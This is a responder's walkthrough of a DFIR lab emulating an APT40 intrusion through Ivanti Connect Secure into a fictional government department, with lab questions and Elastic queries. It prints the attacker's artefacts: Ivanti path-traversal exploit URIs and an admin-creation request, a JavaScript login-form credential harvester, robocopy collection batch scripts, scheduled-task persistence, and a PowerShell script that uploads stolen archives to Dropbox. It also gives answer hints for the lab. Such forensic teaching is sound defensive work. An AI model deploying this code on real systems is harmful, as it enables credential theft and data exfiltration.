## **LAB CONTRIBUTORS**
Adversarial Emulator: @ZephrFish
Incident Responder: @svch0st

## **THREAT ACTOR**
APT 40 attributed to the Hainan State Security Department, a branch of the Chinese Ministry of State Security.
This incident is an emulation of the write ups below
[https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/apt40-advisory-prc-mss-tradecraft-in-action](https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/apt40-advisory-prc-mss-tradecraft-in-action)
[https://cloud.google.com/blog/topics/threat-intelligence/apt40-examining-a-china-nexus-espionage-actor](https://cloud.google.com/blog/topics/threat-intelligence/apt40-examining-a-china-nexus-espionage-actor)

## **LAB DESCRIPTION**
This lab simulates a targeted cyber intrusion against the Department of Trade and Finance (DoTF) of the Southeast Asian nation, The Meow Islands. Modeled on known tactics of APT40, the scenario begins with the exploitation of a vulnerable Ivanti Connect Secure appliance, leading to a full on-premise compromise of government infrastructure.

Participants will step into the role of incident responders tasked with investigating and mitigating the breach. The lab emphasizes realistic threat actor behavior, forensic analysis, and strategic data protection. The lab objectives include:
- Exploitation of Ivanti Connect Secure
- Edge device compromise analysis
- Sideloading via trusted AntiVirus binaries
- Cyber espionage targeted data collection and exfiltration

## **SCOPING NOTE**
The Meow Islands are a nation in South East Asia and their Department of Trade and Finance (DoTF) needs your help! Like many Pacific Island nations, the Meow Islands hold a significant geopolitical position in the region. DoTF is the central economic authority of The Meow Islands and plays a key role in managing the nation's financial operations and facilitating international trade relations.

One of the IT administrators at DoTF (Jennifur Bennett - dotf\jbennett) noticed her account had been logged in from the SSL VPN (Ivanti Connect Secure) that she didnt recognise. The scoping team has collected key evidence to start your investigation. They also provided some specific information on the non-standard evidence source, the virtual Ivanti Connect Secure appliance.

**Ivanti Connect Secure** Your team has acquired and decrypted the Ivanti Connect Secure device and collected information for you. While syslog had been confirmed to forward to Elastic, below are the additional artefacts for your investigation:

- Filesystem - An image of each activated Logical Volume in the path /IvantiConnectSecure/DecryptedDisks/. A bodyfile was also created based on the mounted images in /IvantiConnectSecure/FileSystemTimeline/. We have also provided you the mapping that would appear if rebuilt on the root fileystem below. This may help when answering questions on file paths.
- ivanti_groupA_home.dd (/dev/groupA/home) - /mnt/ivanti/home/root > /
- ivanti_groupA_runtime.dd (/dev/groupA/runtime) - /mnt/ivanti/runtime > /data
- ivanti_groupS_swap.dd (/dev/groupS/swap) - /mnt/ivanti/swap > /tmp
- ivanti_groupZ_home.dd (/dev/groupZ/home)

You can use 7zip to quickly review these raw dd images and use FTK Imager to mount them to a drive letter which may assist recursively searching through them.
- Logs - Export of logs are in /IvantiConnectSecure/LogCollection/
- Snapshot (Support Package) - A decrypted support snapshot is in /IvantiConnectSecure/SupportSnapshot/
- Timezone of Customer - UTC+10
## **NETWORK DIAGRAM**
Below is an image of the infected part of the network that we can have access to. Every system you see here is in-scope for the incident.
## Edge Device Exploitation
**Q1. The Ivanti Connect Secure Support Snapshot runs and saved a number of diagnostic commands. What is the software version of the Ivanti Connect Secure that is part of this network (not OS version)?**

After spending some time reading the threat reports and PoCs like [this](https://packetstorm.news/files/id/176668), and hunting for the URI indicators in https://github.com/duy-31/CVE-2023-46805_CVE-2024-21887 in Elastic, I came up empty-handed.

I looked for more threat intel reports, and I found a few from Mandiant relevant to the case:
https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day
https://cloud.google.com/blog/topics/threat-intelligence/investigating-ivanti-zero-day-exploitation

After reviewing the `PuleSecureLogs/logs` folder in the evidence, I found the answer in `log.localhost2-Sat-2025-08-02_11_24_02-(GMT+10_00).events`!

**Q2. What domain account was used to join the Ivanti Connect Secure appliance to the Department of Trade and Finance (DoTF) Active Directory domain?**

I looked for Event ID 3260 (generated on a workstation and indicates a computer has joined a domain) and Event ID 4741 (generated on a domain controller and indicates a computer account has been created), which didn't produce any results. It seems likely I'll need to review the Ivanti logs.

I looked for evidence of the intrusion in Elastic given some of the keywords in the reports:
```
/api/v1/totp/user-backup-code/../../configuration/system/configuration /api/v1/totp/user-backup-code/../../system/active-users

/api/v1/totp/user-backup-code/../../configuration/administrators/admin-realms/realm/Admin%20Users

/authentication/auth-servers/authserver/System%20Local/local/users/user

-H 'Content-Type:application/json' -d '{"change-password-at-signin": "false", "consoleaccess": "false", "enabled": "true", "fullname": "new user", "one-timeuse": "false", "password-cleartext": "new_password", "username": "login_user"}'
```

Unfortunately, I didn't surface anything in the logs. I did find something in the disk images, but we'll go over that later.

What are the message IDs (`message_id`) in the VPN logs? We can rely on this handy [table](https://github.com/SeizeCyber/Ivanti-Secure-Connect-Logs-Parser/blob/main/ive_msgs_table.csv). Here are the messages that were relevant to my investigation:

| Category               | MsgDescription                | MsgCode  |
| ---------------------- | ----------------------------- | -------- |
| UnauthenticatedRequest | LogAllRequest                 | AUT31556 |
| Authenticate           | SigninRejectLogUser           | AUT31985 |
| Authenticate           | LogAutSuccess                 | AUT24326 |
| FileRequest            | BookmarkAccessStart           | FBR32068 |
| WebRequest             | SESSIONStart                  | WEB32064 |
| SystemStatus           | IntegrityScanNewFilesDetected | SYS32039 |
| SystemStatus           | IntegrityScanModifiedFiles    | SYS32040 |

What other anomalies are there? Lets look at the frequency of `useragent` values: the most interesting one was `Mozilla/5.0 (=ↀωↀ=) MeowBrowser/1.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)`. A quick query using `useragent` and this unique value shows probable attacker activity.

**Q3. Based on answer to the software version question, what was the likely CVE that the actor used gain remote code execution?**

You can learn this through a careful review of the references in Q1.

**Q4. Research the CVE from the previous question. Can you determine the most likely full URI that was used in the POST request leading to remote code execution (RCE). Note: You will need to review the files on the decrypted filesystem to answer this question.**

This was difficult to learn. In the second Mandiant TI that I reference in Q1, there's mention of an attacker clearing a file that would record exploitation attempts. The runtime disk image contains a `.old` copy of the file before it has been cleared. You'll see a POST request with a URI that is also shown in the proof of concept linked in Q1.

## Meowdified Files
**Q1. According to the Integrity Scan results found in the Ivanti logs, how many new files were reported on the device during the most recent scan?**

Review `message_id` logs with the value `SYS32039` (IntegrityScanNewFilesDetected).

**Q2. How many files were listed as modified in the latest Integrity Scan event log? Note: It looks like there is some baseline events that existed on the device before the compromise.**

Review `message_id` logs with the value `SYS32040` (IntegrityScanModifiedFiles).

**Q3. Using the time window of when the number of new and modified files changed, can you identify the file extension that those new files had in common? In the decrypted image, there is a file called /etc/manifest/manifest. You can use this to see what files are expected to be on the host or not. Be careful using this in the wild - actors can edit this too!**

Given the time window (the scan appears to run every two hours) and a review of the timeline CSV, you can work this out quickly. 

**Q4. What was the name of the file that was changed (not created)?**

If you read the integrity scan logs, ie:
```
message_id: "SYS_32040"
```

You'll notice that the number of mismatched files changes from 2 to 3. In the timestamp range of these log lines, you'll see a Perl module file.

Initial Access
Execution
Persistence
Privilege Escalation
Defense Evasion
Credential Access
Discovery
Lateral Movement
Collection
Command and Control
Exfiltration
Impact

**Q5. What was this file's SHA265 supposed to be (before modification)?**

Look for the corresponding hash in `/etc/manifest/manifest`.

**Q6. Analyse this file carefully. What was the string that the threat actor uses to encrypt captured credentials with?**

Thanks to one of the Mandiant TI reports (see the section `Credential Harvesting`, we have an idea what changes to hunt. The code collects usernames and passwords for successful authentications, then uses an RC4 encryption routine with a hard-coded key followed by base-64 encoding to a file in `/tmp/`.

When looking over the mounted disk images, the path that the code writes the credentials to aren't on the volume, but a quick search of the other volumes is successful. There are multiple duplicate entries, but we see credentials for `jbennett` and `svc-admin`.

Before I proceed, I think its important to discuss the earliest documented presence of the attacker, `/mnt/ivanti/home/root/home/webserver/htdocs/dana-na/auth/lastauthserverused.js`, created on June 30, 2025 @ 08:05:00. This is a variant of the WARPWIRE credential harvester, which intercepts auth attempts to the VPN. Unlike the Perl module, this captures all login attempts (even the failed ones) and can't be detected by monitoring auth logs alone as it executes in the victim's browser instead of the server. Its also likely how the attacker obtained credentials for `jbennett` and logged into the VPN on July 30! Anyway, here's what it looks like:

```javascript
function Login(setCookies){
	var wdata=document.frmLogin.username.value;
	var sdata=document.frmLogin.password.value;
	
	if(wdata&&sdata){
		var payload=btoa(wdata+:+sdata);
		var xhr=new XMLHttpRequest();
		xhr.open(GET,/dana-na/css/theme.css?c=+payload,false);
		xhr.send(null);
	}
	LoginImpl();
	return true;
}
```

Additionally, we have evidence of the POST request used for remote code execution on July 30, 2025 @ 19:57:42

```
/bin/sh: filter_default: command not found
[pid: 22010|app: 0|req: 1/1] 172.20.1.4 () {34 vars in 581 bytes} [Wed Jul 30 19:57:42 2025] POST /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection => generated 54 bytes in 977 msecs (HTTP/1.1 200) 2 headers in 71 bytes (1 switches on core 0)
/bin/sh: filter_default: command not found
[pid: 22010|app: 0|req: 2/2] 172.20.1.4 () {34 vars in 581 bytes} [Wed Jul 30 19:58:00 2025] POST /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection => generated 54 bytes in 1803 msecs (HTTP/1.1 200) 2 headers in 71 bytes (1 switches on core 0)
...brutally killing workers...
```



**Q7. Where did these captured results get saved to according to this file?**

See the work in Q5/Q6!

**Q8. The file path from the previous question is not accessible from the internet. What was the path on the file system the threat actor used to access captured results from the internet? Note: Make sure your answer accounts for the mappings of the mounted drives (see scoping notes) and is the path of the file that would be on the running host.

The TA writes a symbolic link along with two other files, and it contains a path to the harvested credentials. This is a simple and stealthy solution to the access issue presented to the attacker: Perl may not be able to write directly to the web server directory, and if it did, there would be additional logs generated that could raise suspicion.

**Q9. What was the IP that requested this location multiple times?**

Once you query the Elastic instance for the name of the symbolic link and filter for the column `raw_message`, you'll see a large number of unauthenticated requests from a suspicious IP that we've seen before (not in the chronological order of the breach, but in my investigation of it).

**Q10. According to these request logs, what was the first URI this IP accessed? Note: Depending on the source you use, there may be data missing...**

Search in Elastic for the IP in `raw_message`.

**Q11. What was the first user that had their credential recorded?**

This is easy as there are only two unique entries. I used CyberChef to perform base64 decoding then RC4 decryption with the key.

**Q12. What was that user's password that was recorded?**

See above.

**Q13. What was the last user that had their credential recorded?**

See the earlier work in this section!

## Furward Movement
**Q1. What was the name of the SSLVPN bookmark used by the actor to access the internal network?**

Review the logs related to the unusual `MeowBrowser` agent.

**Q2. What was the user agent of the actor's browser associated with this initial activity?**

Add `useragent` as a column, then review the Field statistics tab. There is a UA that will jump out at you!

**Q3. What was the local IP address that the threat actor made an RDP connection to via the SSLVPN?**

As in Q1, this becomes apparent after filtering for the unusual UA and you look at the series of `raw_message` values in each log.

## Curiosity Scan
**Q1. Once they gained access to a window host, what was the inbuilt Windows binary the threat actor used to display information about users currently logged on target IPs?**

I use a query that I commonly rely on, with some changes (I'll check the process command-line first, then the parent. If there's noise in the results like the Azure Windows VM Agent generating logs, I'll exclude it):
```yaml
event.code: "1" AND 
process.parent.command_line: *powershell.exe*
```

The user recon activity is shown in the first chronological event. Related activity includes:

| @timestamp                  | host.hostname | process.parent.pid | process.parent.command_line                                 | process.pid | process.command_line                               |
| --------------------------- | ------------- | ------------------ | ----------------------------------------------------------- | ----------- | -------------------------------------------------- |
| Jul 31, 2025 @ 20:16:49.214 | meow-SRV01    | 1,112              | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" | 7,960       | "C:\Windows\system32\ipconfig.exe"                 |
| Jul 31, 2025 @ 20:17:00.212 | meow-SRV01    | 1,112              | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" | 1,108       | "C:\Windows\system32\nslookup.exe" meow-srv01      |
| Jul 31, 2025 @ 20:17:11.428 | meow-SRV01    | 1,112              | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" | 8,304       | "C:\Windows\system32\nslookup.exe" dotf.gov.meow   |
| Jul 31, 2025 @ 20:17:24.640 | meow-SRV01    | 1,112              | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" | 6,288       | "C:\Windows\system32\nslookup.exe" meow-wks01      |
| Jul 31, 2025 @ 20:17:49.635 | meow-SRV01    | 1,112              | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" | 8,892       | "C:\Windows\system32\nslookup.exe" meow-wks02      |
| Jul 31, 2025 @ 20:17:52.228 | meow-SRV01    | 1,112              | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" | 7,508       | "C:\Windows\system32\nslookup.exe" meow-wks03      |

**Q2. How many different IPs did they run this tool against?**

See the output from the query in Q1.

**Q3. What was the tool the threat actor downloaded to conduct discovery and enumeration on the Active Directory?**

Given the wording of this question, I opted to search for Sysmon file creation events with the Mark of the Web in the path:
```yaml
file.path: *Zone.Identifier AND 
event.code: "11"
```

| Timestamp                   | Host Name  | Process ID | Process Executable                                           | File Path                                                      |
| --------------------------- | ---------- | ---------- | ------------------------------------------------------------ | -------------------------------------------------------------- |
| Jul 28, 2025 @ 00:09:01.131 | meow-wks03 | 996        | C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe | C:\users\ploper\Downloads\DropboxInstaller.exe:Zone.Identifier |
| Jul 28, 2025 @ 00:40:35.500 | meow-wks02 | 4,536      | C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe | C:\users\lwilliams\Downloads\ChromeSetup.exe:Zone.Identifier   |
| Jul 31, 2025 @ 20:16:20.742 | meow-srv01 | 2,380      | C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe | C:\users\jbennett\Downloads\REDACTED.exe:Zone.Identifier       |
| Jul 31, 2025 @ 23:42:59.531 | meow-srv01 | 7,740      | C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe | C:\users\jbennett\Downloads\backup.bat:Zone.Identifier         |
| Aug 1, 2025 @ 01:53:28.615  | meow-srv01 | 6,852      | C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe | C:\users\jbennett\Downloads\back.bat:Zone.Identifier           |
| Aug 1, 2025 @ 08:36:30.962  | meow-srv01 | 6,132      | C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe | C:\users\jbennett\Downloads\backup.bat:Zone.Identifier         |
| Aug 1, 2025 @ 21:05:51.710  | meow-srv01 | 3,280      | C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe | C:\users\svc-admin\Downloads\backup.bat:Zone.Identifier        |
| Aug 1, 2025 @ 21:05:55.507  | meow-srv01 | 4,912      | C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe | C:\users\svc-admin\Downloads\shed.bat:Zone.Identifier          |
| Aug 1, 2025 @ 21:37:55.046  | meow-srv01 | 1,988      | C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe | C:\users\svc-admin\Downloads\BackupClient.zip:Zone.Identifier  |

While we're here, `C:\Users\svc-admin\Downloads\backup.bat` reads:
```
@echo off
mkdir "c:\programdata\Log\chernandez\" 2>nul
mkdir "c:\programdata\Log\bwilliams\" 2>nul
mkdir "c:\programdata\Log\plopez\" 2>nul

C:\WINDOWS\System32\Robocopy.exe \\meow-wks01\c$\users\chernandez\ c:\programdata\Log\chernandez\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.ost *.pst /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\log\chernandez-docs-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks02\c$\users\bwilliams\Documents c:\programdata\Log\bwilliams\Documents\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\log\bwilliams-docs-log.txt


C:\WINDOWS\System32\Robocopy.exe \\meow-wks03\c$\users\plopez\Documents c:\programdata\Log\plopez\Documents\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\log\plopez-docs-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks01\c$\users\chernandez\Desktop c:\programdata\Log\chernandez\Desktop\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\log\chernandez-desk-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks02\c$\users\bwilliams\Desktop c:\programdata\Log\bwilliams\Desktop\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\log\bwilliams-desk-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks03\c$\users\plopez\Desktop c:\programdata\Log\plopez\Desktop\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\log\plopez-desk-log.txt
```

The tool executes shortly after execution, and there are 16 Sysmon network events (Event ID 3) in the log.

**Q4. The actor used RDP to move around. What was the username they used to move from their initial host to a workstation?**

You can learn this with a query for Event ID 21 `Remote Desktop Services: Session logon succeeded`, and the Ivanti appliance host IP `172.20.1.4`.
# Cat-astrophic Payload
**Q1. What was the malicious domain the threat actor staged several tools and scripts on and then download from? Format: my.baddomain.com**

I started hunting for this by looking for Sysmon network events and DNS queries around the timestamps of known malicious file creations identified in the last section:

```yaml
host.name: "meow-srv01" AND
@timestamp> "2025-08-01T21:05:15" AND 
@timestamp< "2025-08-01T21:06:50" AND 
event.code: ("3" OR "22")
```

However, this didn't work when looking for the origin of `shed.bat`. The files don't exist on disk, so I can't look at the ADS metadata. I expanded the timestamp window in hopes that Sysmon was delayed or the file took an unusually long time to download, but it didn't work. Fortunately, I double-checked my timeline and realized that the file creation of `back.bat` was the first in the folder, re-ran my search with the updated timestamps, and found success.

**Q2. What was the Product name of the binary that was used to sideload a payload?**

There's a few ways you can find this. I began working on the section `Hairball Exfil` first, which is how I found the legitimate binary on `meow-WKS03` in `C:\ProgramData\Logs\`. The Application properties showed the product information. There are three files in the folder with the binary, and only the binary pops a result in [VirusTotal](https://www.virustotal.com/gui/file/79e53d36a40951ab328e153bac9c1e3adf3330b45899345e645889b9046f06e0). It helpfully contains this information under the heading `Code insights`: "The binary acts as a proxy DLL for the legitimate Windows Security Center library `wsc.dll`. This is confirmed by the PDB path `D:\work\e0dd96435fde7cb0\BUILDS\Release\x64\wsc_proxy.pdb`. The code loads the legitimate `wsc.dll`, retrieves a function address from it, and then passes its own command line arguments to that function. This DLL proxying technique allows the malware to intercept and potentially manipulate calls to the legitimate system library, a common method for persistence and malicious activity injection."

**Q3. What was the SHA265 of the payload loaded by the answer of the previous question?**

Go find it and run `Get-FileHash -Algo SHA26`! Alternatively, you can likely find it with Sysmon Event ID 7.

# Hairball Exfil
**Q1. What was the name of the binary used by the threat actor to perform collection activities on high-value targets? Format: cmd.exe**

Like Q1 of Curiosity Scan, I gathered this information by running a similar query:
```yaml
event.code: "1" AND 
process.parent.command_line: *cmd.exe* AND NOT 
*VMAgentLogs.zip*
```

This immediately reveals a large number of events with a native Windows binary commonly used by admins to move large volumes of data. It is beloved due to its options like a restartable mode (great if you have an unreliable connection, it would be inconvenient if a long running transfer failed, etc), multi-threaded copy support, monitoring a source folder for changes and running incremental backups, and many other features.

Anyway, the binary is used to copy files with varying document, configuration, spreadsheet, and presentation file types from remote user profile folders to `C:\ProgramData\Log\<hostname>` and subfolders on the remote system. It runs on `meow-SRV01` and `meow-WKS03`, and targets  `meow-WKS01` and `meow-WKS02`.

We also see other interesting events with this query:

| @timestamp                 | host.hostname | process.parent.pid | process.parent.command_line   | process.pid | process.command_line                                                           |
| -------------------------- | ------------- | ------------------ | ----------------------------- | ----------- | ------------------------------------------------------------------------------ |
| Aug 1, 2025 @ 01:54:07.283 | meow-SRV01    | 6,588              | "C:\Windows\System32\cmd.exe" | 9,132       | net session                                                                    |
| Aug 1, 2025 @ 01:56:51.816 | meow-SRV01    | 8,388              | "C:\Windows\system32\cmd.exe" | 7,044       | cscript //nologo "C:\Users\jbennett\AppData\Local\Temp\enable_backup_priv.vbs" |
| Aug 1, 2025 @ 08:36:52.659 | meow-SRV01    | 8,388              | "C:\Windows\system32\cmd.exe" | 7,744       | ping -n 1 meow-wks01                                                           |
| Aug 1, 2025 @ 08:57:00.263 | meow-WKS03    | 11,400             | "C:\Windows\system32\cmd.exe" | 16,500      | ping 10.20.3.11                                                                |

**Q2. How many file extensions did the actor intend to look for?**

This was not straightforward to work out due to the vague wording of the question. The TA executed the binary 54 times in the environment with varying file extensions. The first few answers I attempted didn't work: I used the sum of file extensions in one event with the binary, then the sum in another event with the largest number of file extensions. Neither was accepted, so I'm leaving the question alone while I continue my investigation.

Later, I found the script associated with the scheduled task, and the number of file extensions in the first execution of the binary was accepted.

**Q3. The command appears to only look back for recently modified files. In days, what is this value?**

Review the arguments and parameters, then consult publicly available docs!

**Q4. How many different scheduled tasks were created to facilitate ongoing collection?**

```yaml
event.code: "1" AND 
process.command_line.text: (*schtask* AND *robocopy*)
```

The command-line execution looks like this:
```shell
schtasks  /create /tn "Robocopy_Backup_AM" /tr "cmd /c \"C:\..\shed.bat"" /sc daily /st 03:00 /ru SYSTEM /rl highest /f
```

The actual contents of `C:\Users\svc-admin\Downloads\shed.bat` read:
```
@echo off
setlocal enabledelayedexpansion

if /i "%~1"=="/setup" goto :SETUP_TASK

mkdir "c:\programdata\Logs\chernandez\" 2>nul
mkdir "c:\programdata\Logs\bwilliams\" 2>nul
mkdir "c:\programdata\Logs\plopez\" 2>nul

C:\WINDOWS\System32\Robocopy.exe \\meow-wks01\c$\users\chernandez\ c:\programdata\Logs\chernandez\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.ost *.pst /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\logs\chernandez-docs-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks02\c$\users\bwilliams\Documents c:\programdata\Logs\bwilliams\Documents\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\logs\bwilliams-docs-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks03\c$\users\plopez\Documents c:\programdata\Logs\plopez\Documents\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\logs\plopez-docs-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks01\c$\users\chernandez\Desktop c:\programdata\Logs\chernandez\Desktop\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\logs\chernandez-desk-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks02\c$\users\bwilliams\Desktop  c:\programdata\Logs\bwilliams\Desktop\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\logs\bwilliams-desk-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks03\c$\users\plopez\Desktop c:\programdata\Logs\plopez\Desktop\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\logs\plopez-desk-log.txt

goto :eof

:SETUP_TASK
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ERROR: Setup requires administrative privileges
    echo Please run as administrator
    pause
    exit /b 1
)

set "TASK_NAME_AM=Robocopy_Backup_AM"
set "TASK_NAME_PM=Robocopy_Backup_PM"
set "RUN_TIME_AM=03:00"
set "RUN_TIME_PM=21:00"
set "TARGET_DIR=C:\ProgramData\Logs"
set "TARGET_SCRIPT=%TARGET_DIR%\shed.bat"
set "SCRIPT_PATH=%~f0"

echo Setting up scheduled tasks...
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" 2>nul

:: Copy script to known location
if not "%SCRIPT_PATH%"=="%TARGET_SCRIPT%" (
    copy /Y "%SCRIPT_PATH%" "%TARGET_SCRIPT%" >nul
)

:: Remove existing tasks if present
schtasks /query /tn "%TASK_NAME_AM%" >nul 2>&1
if %errorLevel%==0 schtasks /delete /tn "%TASK_NAME_AM%" /f >nul

schtasks /query /tn "%TASK_NAME_PM%" >nul 2>&1
if %errorLevel%==0 schtasks /delete /tn "%TASK_NAME_PM%" /f >nul

:: Create new tasks
schtasks /create /tn "%TASK_NAME_AM%" /tr "cmd /c \"%TARGET_SCRIPT%\"" /sc daily /st %RUN_TIME_AM% /ru SYSTEM /rl highest /f
schtasks /create /tn "%TASK_NAME_PM%" /tr "cmd /c \"%TARGET_SCRIPT%\"" /sc daily /st %RUN_TIME_PM% /ru SYSTEM /rl highest /f

echo.
echo Scheduled tasks created:
echo - %TASK_NAME_AM% at %RUN_TIME_AM%
echo - %TASK_NAME_PM% at %RUN_TIME_PM%
echo.
pause
exit /b
```

**Q5. What is the full path of the batch script executed by these tasks? Format: C:\path\to\my\file.exe**

Review process creation events with the parent process `cmd.exe` and `schtasks` in the command-line. 

Strangely, the creation of these tasks didn't generate `Event ID 4698: A scheduled task was created`, although you can find other unrelated 4698 events in Elastic (so we know that the policy `Audit Other Object Access Events` is likely enabled). `Event ID 106: Task registered` is generated, although the only artifacts relevant to our investigation that are available are the user that registered it (in this case, SYSTEM) and the task name.

**Q6. Based on this file alone, how many unique users are the actor interested in?**

You can learn this after a look at it!

**Q7. The threat actor looks like they tried a couple tools to exfiltrate data. What was the filename of the PowerShell script that uploaded the collection data?**

The file belongs to the same folder as the script in the scheduled task. Here it is:
```powershell
$AccessToken = "sl.u.AF6ZjwaU..truncated.."
$CurrentDir = Get-Location
$ZipFiles = Get-ChildItem -Path $CurrentDir -Filter *.zip -File
$DropboxApiUrl = "https://content.dropboxapi.com/2/files/upload"

foreach ($File in $ZipFiles) {
    $DropboxPath = "/$($File.Name)"  # Upload to root of Dropbox or change this path

    $Headers = @{
        "Authorization" = "Bearer $AccessToken"
        "Content-Type"  = "application/octet-stream"
        "Dropbox-API-Arg" = (@{
            path = $DropboxPath
            mode = "add"
            autorename = $true
            mute = $false
        } | ConvertTo-Json -Compress)
    }

    Write-Host "Uploading $($File.Name) to Dropbox..."

    try {
        Invoke-RestMethod -Uri $DropboxApiUrl -Method Post -Headers $Headers -InFile $File.FullName
        Write-Host "Uploaded: $($File.Name)`n"
    } catch {
        Write-Warning "Failed to upload $($File.Name): $_"
    }
}
```

**Q8. What is the full URL the threat actor attempted to exfiltrate to?**

Review the script.

**Q9. What is the access token that was included in this script?**

See above.
